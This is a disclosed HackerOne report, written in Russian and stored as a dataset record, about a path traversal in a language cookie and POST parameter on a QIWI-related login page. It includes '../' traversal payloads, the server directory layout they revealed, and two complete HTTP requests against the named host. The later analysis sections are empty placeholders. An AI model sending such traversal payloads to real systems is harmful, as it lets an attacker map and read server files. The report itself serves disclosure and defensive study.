---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '164933'
original_report_id: '164933'
title: '[lk.contact-sys.com] LKlang Path Traversal'
team_handle: qiwi
created_at: '2016-09-01T08:32:16.009Z'
disclosed_at: '2018-11-18T07:25:40.178Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 21
tags:
- hackerone
---

# [lk.contact-sys.com] LKlang Path Traversal

## Metadata

- HackerOne Report ID: 164933
- Weakness: 
- Program: qiwi
- Disclosed At: 2018-11-18T07:25:40.178Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Уязвимый сценарий:** /index.php/LK/login
**Уязвимый параметр:** cookie LKlang, post LK_LANG

Параметр LKlang попадает в путь к подключаемому файлу. Теоретически может привести к чтению файлов или LFI, но без исходников не понятно.
Возможно определение структуры приложения:
```
../../../blahblah/../application/LK/templates/EN/  = RU
../../../system/../application/LK/templates/EN/    = EN
```
Примеры восстановленой структуры приложения:
```
/application/LK/templates/EN/
/application/LK/reports/
/application/LK/document/
/application/LK/configs/
/system/core/configs
/system/modules/database/
/system/modules/security/
/system/modules/services/
/system/modules/system/
```

Пример запроса cookie LKlang
```http
GET /index.php/LK/login HTTP/1.1
Host: lk.contact-sys.com
Cookie: LKlang=../../../application/LK/templates/EN/
Connection: close
```
Пример запроса post LK_LANG
```http
POST /index.php/LK/login HTTP/1.1
Host: lk.contact-sys.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Connection: close

LK_LANG=../../../system/../application/LK/templates/EN/&change_lang=1
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
